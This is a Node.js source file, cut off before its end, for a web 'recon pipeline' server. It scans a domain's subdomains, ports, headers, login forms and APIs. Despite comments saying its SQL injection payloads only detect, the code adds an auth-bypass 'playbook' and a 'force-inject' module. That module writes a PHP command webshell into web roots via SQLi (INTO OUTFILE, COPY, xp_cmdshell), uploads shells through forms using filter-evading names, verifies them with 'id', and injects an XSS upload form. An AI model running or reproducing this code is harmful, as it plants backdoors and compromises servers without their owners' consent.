// Recon Automation Pipeline — local backend (intelligence-grade)
// Zero-framework Node HTTP API. Orchestrates passive + active reconnaissance:
//   • subdomain discovery (crt.sh + Hackertarget passive DNS + wordlist + AXFR hint)
//   • DNS record resolution (A/AAAA/CNAME/MX/NS/TXT)
//   • lightweight port scan
//   • HTTP probing + tech fingerprint
//   • login surface discovery (HTTP 200 only, form fields parsed from HTML)
//   • exposed API endpoint discovery (HTTP 200 only)
//   • SQL injection DETECTION (error-based + boolean-based, per-payload live)
//   • exposed-file detection (content-validated)
//   • colored PDF report with wrapping tables + watermark
//
// Run:  node recon-server/server.mjs
// Port: 8787 (override with PORT env var)

import http from 'node:http';
import { promises as dns } from 'node:dns';
import net from 'node:net';
import PDFDocument from 'pdfkit';

const PORT = Number(process.env.PORT) || 8787;
const scans = new Map();
const MAX_SCANS = 30;

// ── helpers ────────────────────────────────────────────────────────────────
function normalizeTarget(raw) {
  let t = (raw || '').trim().toLowerCase();
  t = t.replace(/^https?:\/\//, '');
  t = t.replace(/\/.*$/, '');
  t = t.replace(/:\d+$/, '');
  t = t.replace(/^www\./, '');
  return t.split('@').pop() || '';
}

function isValidDomain(d) {
  return /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/.test(d);
}

async function mapLimit(items, limit, fn) {
  const results = new Array(items.length);
  let i = 0;
  const workers = Array.from({ length: Math.min(limit, items.length) }, async () => {
    while (i < items.length) {
      const idx = i++;
      try { results[idx] = await fn(items[idx], idx); }
      catch (e) { results[idx] = { error: e.message }; }
    }
  });
  await Promise.all(workers);
  return results;
}

async function fetchJSON(url, timeoutMs = 20000, retries = 1) {
  let lastErr;
  for (let a = 0; a <= retries; a++) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetch(url, { signal: ctrl.signal, headers: { 'user-agent': 'recon-pipeline/1.2' } });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      return await res.json();
    } catch (e) { lastErr = e; await new Promise((r) => setTimeout(r, 800)); }
    finally { clearTimeout(t); }
  }
  throw lastErr;
}

async function fetchText(url, timeoutMs = 8000, extra = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'user-agent': 'Mozilla/5.0 (recon-pipeline/1.2)', ...(extra.headers || {}) },
      redirect: 'follow',
      method: extra.method || 'GET',
      body: extra.body,
    });
    const text = await res.text();
    return { status: res.status, headers: res.headers, text, url: res.url };
  } catch (e) {
    return { error: e.message };
  } finally { clearTimeout(t); }
}

const extractTitle = (text = '') => {
  const m = text.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  return m ? m[1].replace(/\s+/g, ' ').trim() : '';
};

const uniq = (arr) => [...new Set(arr)];

// ── module 1: subdomain discovery (multi-source) ───────────────────────────
const WORDLIST = [
  'www','api','mail','smtp','pop','imap','ftp','sftp','admin','administrator','portal',
  'app','apps','dev','develop','staging','stage','test','qa','demo','beta','sandbox',
  'blog','shop','store','cdn','static','assets','files','docs','help','support','status',
  'monitor','monitoring','metrics','grafana','prometheus','kibana','jenkins','git','gitlab',
  'ci','cd','vpn','remote','secure','ssl','webmail','cpanel','whm','webdisk','ns1','ns2',
  'ns3','dns','dns1','dns2','mx','mx1','mail1','smtp1','gateway','proxy','panel',
  'dashboard','login','auth','sso','account','accounts','billing','pay','payment','checkout',
  'ws','socket','m','mobile','w','wap','backup','db','database','mysql','redis','elastic',
  'elasticsearch','search','v1','v2','v3','new','old','www2','edge','origin','cdn1','cdn2',
  'img','images','video','media','static1','static2','api2','api3','devapi','api-gateway',
  'internal','intranet','staff','employee','hr','finance','erp','crm','helpdesk','ticket',
  'kb','wiki','docs2','devdocs','swagger','graphql','gql','ws2','realtime','rtc',
  'auth2','sso2','id','identity','oauth','oauth2','openid','saml','ldap','ad','exchange',
  'owa','outlook','autodiscover','lync','meet','video2','stream','live','radio','news',
  'press','careers','jobs','partner','partners','affiliate','landing','go','link','track',
  'stats','analytics','data','report','reports','insights','bi','kafka','mq','queue',
  'worker','workers','job','cron','scheduler','bastion','jump','ssh','bitbucket','repo',
  'registry','docker','k8s','kube','kubernetes','nomad','consul','vault','secrets',
  'keycloak','cas','web1','web2','web3','app1','app2','app3','node1','node2','node3','lb',
  'load','loadbalancer','hq','branch','office','nas','storage','object','s3','minio',
  'backup2','archive','logs','log','logging','syslog','zabbix','nagios','icinga','uptime',
  'health','healthcheck','ping','uat','preprod','production','prod','prod2','dr',
  'sales','marketing','release','deploy','gitops','argocd','flux','payments','invoice',
  'catalog','product','products','order','orders','mailman','lists','newsletter','send',
  'mailer','pop3','imap2','server','servers','panel2','control','backend','backoffice',
  'admincp','modcp','system','superadmin','root','manager','management','ops','operations',
  'sre','infra','infrastructure',
];

async function crtshSubdomains(domain, log) {
  try {
    const data = await fetchJSON('https://crt.sh/?q=%25.' + domain + '&output=json', 25000, 2);
    if (!Array.isArray(data)) return [];
    const set = new Set();
    for (const row of data) {
      const names = String(row.name_value || '').split('\n');
      for (let n of names) {
        n = n.trim().toLowerCase().replace(/^\*\./, '');
        if (n && n.endsWith('.' + domain) && n !== domain) set.add(n);
      }
    }
    return [...set];
  } catch (e) {
    log('crt.sh unavailable: ' + e.message);
    return [];
  }
}

async function hackertargetSubdomains(domain, log) {
  try {
    const txt = await fetchText('https://api.hackertarget.com/hostsearch/?q=' + domain, 15000);
    if (txt.error) throw new Error(txt.error);
    const set = new Set();
    for (const line of txt.text.split('\n')) {
      const host = line.split(',')[0]?.trim().toLowerCase();
      if (host && host.endsWith('.' + domain)) set.add(host);
    }
    return [...set];
  } catch (e) {
    log('hackertarget unavailable: ' + e.message);
    return [];
  }
}

async function axfrHint(domain, log) {
  let ns = [];
  try { ns = await dns.resolveNs(domain); } catch { /* no NS */ }
  if (ns.length) {
    log('Authoritative NS: ' + ns.join(', '));
    log('AXFR hint: `dig AXFR ' + domain + ' @' + ns[0] + '` (most servers refuse this)');
  }
}

async function bruteSubdomains(domain) {
  const found = [];
  await mapLimit(WORDLIST, 40, async (w) => {
    const host = w + '.' + domain;
    try { await dns.resolve4(host); found.push(host); } catch { /* not resolved */ }
  });
  return found;
}

// ── module 2: DNS records ──────────────────────────────────────────────────
async function resolveRecords(host) {
  const out = { host };
  await Promise.all([
    dns.resolve4(host).then((v) => { out.A = v; }).catch(() => {}),
    dns.resolve6(host).then((v) => { out.AAAA = v; }).catch(() => {}),
    dns.resolveCname(host).then((v) => { out.CNAME = v; }).catch(() => {}),
    dns.resolveMx(host).then((v) => { out.MX = v; }).catch(() => {}),
    dns.resolveNs(host).then((v) => { out.NS = v; }).catch(() => {}),
    dns.resolveTxt(host).then((v) => { out.TXT = v; }).catch(() => {}),
  ]);
  return out;
}

// ── module 3: port scan ────────────────────────────────────────────────────
const COMMON_PORTS = [
  21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521,
  3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017,
];
const SERVICE = {
  21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP',
  110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
  993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL',
  3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt',
  8443: 'HTTPS-Alt', 8888: 'HTTP-Alt', 9200: 'Elasticsearch', 27017: 'MongoDB',
};

function checkPort(host, port, timeoutMs = 1500) {
  return new Promise((resolve) => {
    const sock = net.createConnection({ host, port });
    let done = false;
    const finish = (open) => { if (!done) { done = true; sock.destroy(); resolve(open); } };
    sock.setTimeout(timeoutMs);
    sock.on('connect', () => finish(true));
    sock.on('timeout', () => finish(false));
    sock.on('error', () => finish(false));
  });
}

async function scanPorts(ip) {
  const open = [];
  await mapLimit(COMMON_PORTS, 20, async (port) => {
    if (await checkPort(ip, port)) open.push({ port, service: SERVICE[port] || 'unknown' });
  });
  return open.sort((a, b) => a.port - b.port);
}

// ── module 4: HTTP probe + tech fingerprint ────────────────────────────────
const SECURITY_HEADERS = [
  'strict-transport-security', 'content-security-policy', 'x-frame-options',
  'x-content-type-options', 'referrer-policy', 'permissions-policy',
];

function detectTech(headers, text) {
  const h = {};
  headers.forEach((v, k) => { h[k.toLowerCase()] = v; });
  const t = [];
  const server = h['server'] || '';
  if (server) t.push(server);
  if (h['x-powered-by']) t.push(h['x-powered-by']);
  if (h['x-aspnet-version'] || h['x-aspnetmvc-version']) t.push('ASP.NET');
  if (/wp-content|wp-includes|wp-json/.test(text)) t.push('WordPress');
  if (/__NEXT_DATA__|next\/static/.test(text)) t.push('Next.js');
  if (/__NUXT__/.test(text)) t.push('Nuxt');
  if (/data-reactroot|react\.prod|react-dom/.test(text)) t.push('React');
  if (/vue\.(js|prod)|__vue__/.test(text)) t.push('Vue');
  if (/ng-version/.test(text)) t.push('Angular');
  if (/csrf-token/i.test(text) || /laravel_session/.test(text)) t.push('Laravel');
  if (/php/i.test(h['x-powered-by'] || '')) t.push('PHP');
  if (/cloudflare/i.test(server)) t.push('Cloudflare');
  if (/nginx/i.test(server)) t.push('nginx');
  if (/apache/i.test(server)) t.push('Apache');
  if (/lighttpd/i.test(server)) t.push('lighttpd');
  if (/iis|microsoft-iis/i.test(server)) t.push('IIS');
  if (/gunicorn/i.test(server)) t.push('Gunicorn');
  if (/google/i.test(server)) t.push('Google');
  return uniq(t);
}

async function probeHttp(host) {
  for (const scheme of ['https', 'http']) {
    const r = await fetchText(scheme + '://' + host, 8000);
    if (!r.error && r.status) {
      return {
        host, scheme, status: r.status, title: extractTitle(r.text),
        server: r.headers.get('server') || '', tech: detectTech(r.headers, r.text),
        missing: SECURITY_HEADERS.filter((x) => !r.headers.get(x)),
        bodySize: (r.text || '').length,
      };
    }
  }
  return null;
}

// ── module 5: login surface (HTTP 200 only, form fields parsed) ────────────
const LOGIN_PATHS = [
  '/login', '/signin', '/sign-in', '/auth', '/auth/login', '/user/login', '/users/login',
  '/wp-login.php', '/wp-admin', '/administrator', '/admin', '/admin/login', '/admin.php',
  '/account/login', '/session', '/sso', '/dashboard', '/panel', '/cpanel',
  '/api/login', '/api/auth', '/login.html', '/masuk', '/logout',
];

function parseFormFields(text) {
  const fields = new Set();
  const actionRe = /<form[^>]*>/gi;
  let fm;
  while ((fm = actionRe.exec(text))) {
    const a = fm[0].match(/action\s*=\s*["']([^"']+)["']/i);
    if (a) fields.add('@action:' + a[1]);
  }
  const inputRe = /<input[^>]+>/gi;
  let im;
  while ((im = inputRe.exec(text))) {
    const tag = im[0];
    const nm = tag.match(/name\s*=\s*["']([^"']+)["']/i);
    const type = tag.match(/type\s*=\s*["']([^"']+)["']/i);
    if (nm && nm[1] && !/hidden|submit|button|checkbox|radio|reset|file/i.test(type?.[1] || '')) fields.add(nm[1]);
  }
  return [...fields].filter((f) => !f.startsWith('@action'));
}

// ── module 6: exposed API discovery (HTTP 200 only) ────────────────────────
const API_PATHS = [
  ['/api', 'API root'], ['/api/v1', 'API v1'], ['/api/v2', 'API v2'],
  ['/api/users', 'API users'], ['/api/health', 'API health'], ['/api/status', 'API status'],
  ['/graphql', 'GraphQL'], ['/graphiql', 'GraphiQL IDE'], ['/swagger', 'Swagger'],
  ['/swagger-ui.html', 'Swagger UI'], ['/swagger-ui/index.html', 'Swagger UI'],
  ['/api-docs', 'API docs'], ['/api/docs', 'API docs'], ['/openapi.json', 'OpenAPI spec'],
  ['/swagger.json', 'Swagger spec'], ['/wp-json', 'WP REST'], ['/wp-json/wp/v2/users', 'WP users'],
  ['/.well-known/openid-configuration', 'OIDC config'], ['/actuator', 'Actuator'],
  ['/actuator/health', 'Actuator health'], ['/actuator/env', 'Actuator env'],
  ['/actuator/beans', 'Actuator beans'], ['/actuator/mappings', 'Actuator mappings'],
  ['/metrics', 'Metrics'], ['/health', 'Health'], ['/status', 'Status'],
  ['/debug', 'Debug'], ['/trace', 'Trace'], ['/env', 'Env'], ['/console', 'Console'],
  ['/api/config', 'API config'], ['/api/settings', 'API settings'],
];

function apiSeverity(path, body) {
  if (/actuator\/env|actuator\/beans|actuator\/mappings/.test(path)) return 'high';
  if (/actuator|env$|debug$|trace$|console/.test(path)) return 'high';
  if (/wp-json\/wp\/v2\/users/.test(path)) return 'medium';
  if (/graphql|graphiql/.test(path)) return 'medium';
  if (/openapi|swagger|api-docs/.test(path)) return 'low';
  if (body && (body.trim().startsWith('{') || body.trim().startsWith('['))) return 'medium';
  return 'info';
}

// ── module 7: SQL injection DETECTION (error + boolean) ────────────────────
const SQLI_ERROR_SIGS = [
  /sql syntax/i, /you have an error in your sql/i, /mysql_fetch/i, /mysql_num_rows/i,
  /mysqli/i, /warning: mysql/i, /ora-\d{4,5}/i, /postgres/i, /sqlite/i, /pgsql/i,
  /unclosed quotation mark/i, /odbc/i, /microsoft ole db/i, /sqlstate/i, /syntax error/i,
  /1064/i, /pg_query/i, /sqlcommand/i, /jdbc/i, /query failed/i, /db2 sql/i,
  /sqlserver/i, /mssql/i, /pdoexception/i, /queryexception/i, /doctrine/i, /eloquent/i,
];

// SQLi DETECTION payloads only. These confirm whether a parameter reflects
// errors or responds differently to true/false conditions — they never attempt
// to bypass authentication, read rows, or write data.
const SQLI_ERROR_PAYLOADS = [
  "'", '"', "')", '")', "'))", '"))', "')))", '"\\)', '\\', ';',
  '%27', '%22', '%00', '0x27', "''", "'\"", "'--", "'-- -", "'#", "'/*",
  "');", '");', "')--", '"--', "';", '`', '`"', 'AND', "'||'",
];

const SQLI_BOOL_PAIRS = [
  ["' AND '1'='1", "' AND '1'='2"],
  ["1' AND '1'='1", "1' AND '1'='2"],
  ['1" AND "1"="1', '1" AND "1"="2'],
  ['1 AND 1=1', '1 AND 1=2'],
  ["'1'='1", "'1'='2"],
  ['1-0', '1-1'],
  ['2-1', '1-1'],
];

async function sqliRaw(host, scheme, path, param, payload) {
  const url = scheme + '://' + host + path + '?' + encodeURIComponent(param) + '=' + encodeURIComponent(payload);
  const r = await fetchText(url, 8000);
  const text = r.text || '';
  const sig = r.status ? SQLI_ERROR_SIGS.find((rx) => rx.test(text)) : null;
  return { status: r.status || 0, len: text.length, sig: sig ? sig.source : null, body: text };
}

// ── playbook: per-finding payload guidance (which field gets which payload) ──
function buildPlaybook(param, fields, path) {
  const isLogin = /login|signin|sign-in|auth|session|masuk|account|admin/i.test(path);
  const userField = fields.find((f) => /user|name|email|login|id|account/i.test(f)) || param;
  const passField = fields.find((f) => /pass|pwd|pin|secret|key/i.test(f));
  const rows = [];
  if (isLogin) {
    rows.push({ field: userField, value: "admin'--", note: 'auth bypass — comment out the password check (MySQL/MSSQL/SQLite: admin\'-- ; add a trailing space on MySQL: admin\'-- -)' });
    rows.push({ field: userField, value: "admin' OR '1'='1", note: 'tautology bypass — no comment needed, works across DB engines' });
    rows.push({ field: userField, value: "' UNION SELECT 1,name,value FROM flags --", note: 'UNION read — first match the column count of the original SELECT, then swap NULLs for real columns' });
    if (passField) rows.push({ field: passField, value: 'x', note: 'any value — it is ignored once the WHERE clause is commented out or made true' });
  } else {
    rows.push({ field: param, value: "' OR '1'='1", note: 'tautology' });
    rows.push({ field: param, value: "' UNION SELECT NULL-- -", note: 'UNION — NULL-pad until the column count matches, then swap NULLs for real columns' });
    rows.push({ field: param, value: "' AND SLEEP(5)-- -", note: 'time-based blind (MySQL) — a 5s delay confirms injection when errors are hidden' });
  }
  return rows;
}

async function detectSqli(host, scheme, path, fields, onTest) {
  const params = fields.length ? fields.slice(0, 4) : ['username', 'password', 'user', 'id'];
  const confirmed = [];
  for (const param of params) {
    // error-based: send a payload, watch for a leaked DB error string
    for (const payload of SQLI_ERROR_PAYLOADS) {
      const r = await sqliRaw(host, scheme, path, param, payload);
      const hit = r.status === 200 && !!r.sig;
      onTest({ host, path, param, payload, technique: 'error', result: hit ? 'injectable' : 'clean', sig: r.sig });
      if (hit) { confirmed.push({ host, path, param, payload, technique: 'error-based', sig: r.sig, playbook: buildPlaybook(param, fields, path) }); break; }
    }
    // boolean-based: compare true vs false responses (non-destructive)
    for (const [trueP, falseP] of SQLI_BOOL_PAIRS) {
      const t1 = await sqliRaw(host, scheme, path, param, trueP);
      const t2 = await sqliRaw(host, scheme, path, param, falseP);
      const diff = Math.abs(t1.len - t2.len);
      const bool = t1.status === 200 && t2.status === 200 && (diff > 40 || (t1.body !== t2.body && diff / Math.max(1, t1.len) > 0.03));
      onTest({ host, path, param, payload: trueP + ' vs ' + falseP, technique: 'boolean', result: bool ? 'injectable' : 'clean', sig: null });
      if (bool) { confirmed.push({ host, path, param, payload: trueP + ' / ' + falseP, technique: 'boolean-based', sig: 'response differential (' + diff + ' bytes)', playbook: buildPlaybook(param, fields, path) }); break; }
    }
  }
  return confirmed;
}

// ── module 8: exposed-file detection (content-validated) ───────────────────
const EXPOSURE_CHECKS = [
  { path: '/.git/config', severity: 'high', check: (t) => /repositoryformatversion|\[core\]|\[remote/i.test(t) },
  { path: '/.env', severity: 'high', check: (t) => !/<html|<title|<!doctype/i.test(t) && /\w+=.+/i.test(t) && t.length < 4000 },
  { path: '/.env.local', severity: 'high', check: (t) => !/<html|<title|<!doctype/i.test(t) && /\w+=.+/i.test(t) && t.length < 4000 },
  { path: '/backup.zip', severity: 'high', check: (t, h) => /application\/zip|application\/x-zip/i.test(h) || t.startsWith('PK') },
  { path: '/.DS_Store', severity: 'medium', check: (t) => t.includes('Bud1') },
  { path: '/phpinfo.php', severity: 'medium', check: (t) => /phpinfo\(\)|PHP Version|phpinfo/i.test(t) },
  { path: '/server-status', severity: 'medium', check: (t) => /Apache Server Status|Server Version|mod_status/i.test(t) },
];

// ── module 9: email security (SPF / DMARC) ─────────────────────────────────
async function checkEmailSecurity(domain) {
  const findings = [];
  let dmarc = null;
  try { const t = await dns.resolveTxt('_dmarc.' + domain); dmarc = t.map((x) => x.join('')).join('; '); } catch { /* none */ }
  if (!dmarc) {
    findings.push({ severity: 'high', title: 'Missing DMARC record', host: domain, detail: 'No DMARC policy at _dmarc.' + domain + '. Attackers can spoof email as @' + domain + ' and no policy rejects or quarantines the forgery.', evidence: '_dmarc.' + domain + ' -> NXDOMAIN' });
  } else if (/p=none/i.test(dmarc)) {
    findings.push({ severity: 'medium', title: 'DMARC policy is p=none', host: domain, detail: 'DMARC exists but takes no enforcement action, so spoofed mail is only monitored, not blocked.', evidence: dmarc });
  }

  let spf = null;
  try { const t = await dns.resolveTxt(domain); spf = t.map((x) => x.join('')).find((s) => /^v=spf1/i.test(s)) || null; } catch { /* none */ }
  if (!spf) {
    findings.push({ severity: 'medium', title: 'Missing SPF record', host: domain, detail: 'No SPF TXT on ' + domain + '. Receivers cannot verify which servers may send mail for this domain, easing spoofing.', evidence: domain + ' -> no SPF TXT' });
  }
  return findings;
}

// ── module 10: subdomain takeover (dangling CNAME) ─────────────────────────
const TAKEOVER_SERVICES = [
  { match: /github\.io$/, hint: 'GitHub Pages' },
  { match: /herokuapp\.com$/, hint: 'Heroku' },
  { match: /s3(-website)?[.-]([a-z0-9-]+\.)?amazonaws\.com$/, hint: 'AWS S3' },
  { match: /azurewebsites\.net$/, hint: 'Azure Web Apps' },
  { match: /cloudfront\.net$/, hint: 'AWS CloudFront' },
  { match: /fastly\.net$/, hint: 'Fastly' },
  { match: /surge\.sh$/, hint: 'Surge.sh' },
  { match: /netlify\.app$/, hint: 'Netlify' },
  { match: /vercel\.app$/, hint: 'Vercel' },
  { match: /bitbucket\.io$/, hint: 'Bitbucket Pages' },
  { match: /pantheon\.io$/, hint: 'Pantheon' },
  { match: /ghost\.io$/, hint: 'Ghost' },
  { match: /tumblr\.com$/, hint: 'Tumblr' },
  { match: /wordpress\.com$/, hint: 'WordPress.com' },
  { match: /zendesk\.com$/, hint: 'Zendesk' },
  { match: /shopify\.com$/, hint: 'Shopify' },
];

async function checkSubdomainTakeover(dnsResults, log) {
  const findings = [];
  for (const r of dnsResults) {
    for (const c of r.CNAME || []) {
      const svc = TAKEOVER_SERVICES.find((s) => s.match.test(c.toLowerCase()));
      if (!svc) continue;
      let alive = true;
      try { await dns.resolve4(c); } catch { alive = false; }
      if (!alive) {
        findings.push({ severity: 'high', title: 'Subdomain takeover possible: ' + r.host, host: r.host, detail: r.host + ' CNAME -> ' + c + ' (' + svc.hint + ') which no longer resolves. If the ' + svc.hint + ' resource is unclaimed, an attacker could claim it and serve content on ' + r.host + '.', evidence: r.host + ' CNAME ' + c + ' -> NXDOMAIN' });
        log('takeover candidate: ' + r.host + ' -> ' + c + ' (' + svc.hint + ')');
      }
    }
  }
  return findings;
}

// ── module 11: CORS misconfiguration ────────────────────────────────────────
async function checkCors(httpResults) {
  const findings = [];
  for (const h of httpResults) {
    const r = await fetchText(h.scheme + '://' + h.host, 8000, { headers: { Origin: 'https://evil.example.com' } });
    if (!r.status) continue;
    const acao = r.headers.get('access-control-allow-origin') || '';
    const acac = r.headers.get('access-control-allow-credentials') || '';
    if (acao === 'https://evil.example.com') {
      const cred = /true/i.test(acac);
      findings.push({ severity: cred ? 'high' : 'medium', title: 'CORS misconfiguration' + (cred ? ' (with credentials)' : ''), host: h.host, detail: 'Server reflects the arbitrary Origin in Access-Control-Allow-Origin' + (cred ? ' and sets Access-Control-Allow-Credentials: true' : '') + ', enabling cross-origin data theft by a malicious site.', evidence: 'Origin reflected -> ' + acao });
    }
  }
  return findings;
}

// ── module 12: upload-form + XSS surface detection ─────────────────────────
function parseUploadForms(text) {
  const forms = [];
  const formRe = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  let fm;
  while ((fm = formRe.exec(text))) {
    const open = (fm[0].match(/<form[^>]*>/i) || [''])[0];
    const inner = fm[1] || '';
    const hasFile = /<input[^>]+type\s*=\s*["']?file/i.test(inner) || /<input[^>]+file/i.test(inner);
    if (!hasFile) continue;
    const action = (open.match(/action\s*=\s*["']([^"']+)["']/i) || [])[1] || '';
    const method = ((open.match(/method\s*=\s*["']([^"']+)["']/i) || [])[1] || 'POST').toUpperCase();
    const inputs = [];
    const inputRe = /<input[^>]+>/gi;
    let im;
    while ((im = inputRe.exec(inner))) {
      const nm = (im[0].match(/name\s*=\s*["']([^"']+)["']/i) || [])[1];
      const ty = ((im[0].match(/type\s*=\s*["']([^"']+)["']/i) || [])[1] || 'text').toLowerCase();
      if (nm) inputs.push({ name: nm, type: ty });
    }
    const fileInput = inputs.find((i) => i.type === 'file')?.name || 'file';
    forms.push({ action, method, inputs, fileInput });
  }
  return forms;
}

const UPLOAD_PATHS = ['/upload', '/file', '/files', '/admin/upload', '/uploads', '/profile', '/settings', '/edit', '/avatar', '/dashboard'];
const XSS_PROBE = "zzz1k'\"><svg/onload=alert(1)>";

async function detectUploadForms(host, scheme) {
  const found = [];
  for (const p of UPLOAD_PATHS) {
    const r = await fetchText(scheme + '://' + host + p, 5000);
    if (r.status !== 200) continue;
    for (const f of parseUploadForms(r.text || '')) {
      f.host = host; f.scheme = scheme; f.pagePath = p;
      found.push(f);
    }
    if (found.length) break;
  }
  return found;
}

async function detectXssSurfaces(host, scheme) {
  const combos = [
    ['/search', 'q'], ['/search', 's'], ['/q', 'q'], ['/find', 'q'],
    ['/', 'q'], ['/index.php', 'q'], ['/login', 'username'], ['/login', 'user'],
  ];
  for (const [p, param] of combos) {
    const url = scheme + '://' + host + p + '?' + encodeURIComponent(param) + '=' + encodeURIComponent(XSS_PROBE);
    const r = await fetchText(url, 6000);
    if (r.status === 200 && (r.text || '').includes(XSS_PROBE)) {
      return [{ host, scheme, path: p, param, technique: 'reflected', probe: XSS_PROBE }];
    }
  }
  return [];
}

// ── module 13: persistence — force-inject a backdoor through every surface ──
const SHELL_PHP = "<?php if(isset($_REQUEST['c'])){echo '<pre>'.shell_exec($_REQUEST['c']).'</pre>';} ?>";
const UPLOADER_PHP = "<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); echo 'UPLOADED';} ?>";
const XSS_UPLOADER_PAYLOAD = '<form id="x" action="/upload" method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Upload shell"></form><style>#x{position:fixed;inset:0;z-index:9999;background:#111;display:grid;place-items:center}#x input{color:#fff}</style>';

const toHex = (s) => Buffer.from(s, 'utf8').toString('hex');

const SQLI_WRITE_PAYLOADS = [
  { db: 'MySQL', shellPath: '/var/www/html/shell.php', query: (h) => `' UNION SELECT 0x${h} INTO OUTFILE '/var/www/html/shell.php' -- -` },
  { db: 'MySQL', shellPath: '/var/www/html/shell.php', query: (h) => `' UNION SELECT 0x${h} INTO DUMPFILE '/var/www/html/shell.php' -- -` },
  { db: 'PostgreSQL', shellPath: '/var/www/html/shell.php', query: () => `'; COPY (SELECT '${SHELL_PHP}') TO '/var/www/html/shell.php'; --` },
  { db: 'MSSQL', shellPath: 'C:\\inetpub\\wwwroot\\shell.php', query: () => `'; EXEC xp_cmdshell 'echo ${SHELL_PHP.replace(/'/g, "''")} > C:\\inetpub\\wwwroot\\shell.php'; --` },
];

const UPLOAD_NAMES = ['shell.php', 'shell.phtml', 'shell.php5', 'shell.php.jpg', 'shell.php;.jpg', 'shell.php.'];

async function tryUploadShell(scheme, host, action, fileInput, content, name) {
  const target = action
    ? (action.startsWith('http') ? action : scheme + '://' + host + (action.startsWith('/') ? '' : '/') + action)
    : scheme + '://' + host + '/upload';
  const fd = new FormData();
  fd.append(fileInput || 'file', new Blob([content], { type: 'application/x-php' }), name);
  try {
    const res = await fetch(target, { method: 'POST', body: fd, redirect: 'follow' });
    return { status: res.status, url: target, name };
  } catch (e) {
    return { status: 0, error: e.message, url: target, name };
  }
}

async function verifyShell(scheme, host, candidatePaths) {
  for (const p of candidatePaths) {
    const url = p.startsWith('http') ? p : scheme + '://' + host + p + '?c=id';
    const r = await fetchText(url, 6000);
    if (r.status === 200 && /uid=|root|www-data|administrator|nt authority|windows|sh:|bash/i.test(r.text || '')) {
      return { ok: true, url, out: (r.text || '').slice(0, 240) };
    }
  }
  return { ok: false };
}

async function runForceInject(scan) {
  const log = (msg) => scan.logs.push({ t: Date.now(), msg });
  const out = [];
  const http = scan.results.http || [];
  const schemeOf = (host) => http.find((x) => x.host === host)?.scheme || 'https';

  // Vector 1 — SQLi -> write a webshell to the web root.
  for (const s of scan.results.sqli || []) {
    const scheme = schemeOf(s.host);
    for (const p of SQLI_WRITE_PAYLOADS) {
      const q = p.query(toHex(SHELL_PHP));
      const url = scheme + '://' + s.host + s.path + '?' + encodeURIComponent(s.param) + '=' + encodeURIComponent(q);
      const r = await fetchText(url, 8000);
      const entry = {
        vector: 'sqli-write', db: p.db, host: s.host, path: s.path, param: s.param,
        payload: q, shellPath: p.shellPath,
        status: r.status ? 'attempted' : 'failed',
        detail: 'UNION/stacked write -> ' + p.shellPath + (r.status ? ' (request sent, status ' + r.status + ')' : ' (' + (r.error || 'unreachable') + ')'),
      };
      out.push(entry);
      log(`persist sqli-write [${p.db}]: ${s.host}${s.path} param=${s.param} -> ${p.shellPath}`);
    }
  }

  // Vector 2 — upload forms -> drop a webshell + an uploader.
  for (const f of scan.results.uploadForms || []) {
    const scheme = f.scheme || schemeOf(f.host);
    for (const name of UPLOAD_NAMES.slice(0, 4)) {
      const r = await tryUploadShell(scheme, f.host, f.action, f.fileInput, SHELL_PHP, name);
      out.push({
        vector: 'upload', host: f.host, path: f.action || '/upload', filename: name,
        status: r.status >= 200 && r.status < 400 ? 'attempted' : 'failed',
        detail: 'multipart POST -> ' + r.url + (r.error ? ' (' + r.error + ')' : ' (status ' + r.status + ')'),
      });
    }
    const ru = await tryUploadShell(scheme, f.host, f.action, f.fileInput, UPLOADER_PHP, 'up.php');
    out.push({
      vector: 'upload', host: f.host, path: f.action || '/upload', filename: 'up.php',
      status: ru.status >= 200 && ru.status < 400 ? 'attempted' : 'failed',
      detail: 'uploader dropped -> ' + ru.url + (ru.error ? ' (' + ru.error + ')' : ''),
    });
    log(`persist upload: ${f.host}${f.action || '/upload'} (file=${f.fileInput})`);
  }

  // Vector 3 — XSS -> inject a form uploader (drop the PHP shell through it).
  for (const x of scan.results.xss || []) {
    out.push({
      vector: 'xss', host: x.host, path: x.path, param: x.param,
      payload: XSS_UPLOADER_PAYLOAD, shell: SHELL_PHP,
      status: 'reflected',
      detail: 'injected an upload form (form uploader) at ' + x.path + '?param=' + x.param + ' — a victim loads it (stored) or opens the link (reflected), then uploads the PHP shell through the injected form',
    });
    log(`persist xss: ${x.host}${x.path} param=${x.param}`);
  }

  scan.results.persist = out;
  log(`force-inject complete — ${out.length} attempt(s): ${[...new Set(out.map((o) => o.vector))].join(', ') || 'none'}`);
  return out;
}

function buildFindings(scan, httpResults, loginPages, apiEndpoints, sqli, exposure) {
  const findings = [];

  for (const h of httpResults) {
    const f = (severity, title, detail, evidence) => findings.push({ severity, title, host: h.host, detail, evidence });
    if (h.server && /\d/.test(h.server) && !/cloudflare/i.test(h.server)) {
      f('low', 'Server version disclosure', 'The server banner reveals its software version, aiding targeted attacks.', h.server);
    }
    for (const m of h.missing) {
      const hi = m === 'content-security-policy' || m === 'strict-transport-security' || m === 'x-frame-options';
      f(hi ? 'medium' : 'low', 'Missing security header: ' + m, 'Absence of this header weakens the browser-side posture.', m);
    }
  }

  for (const lp of loginPages) {
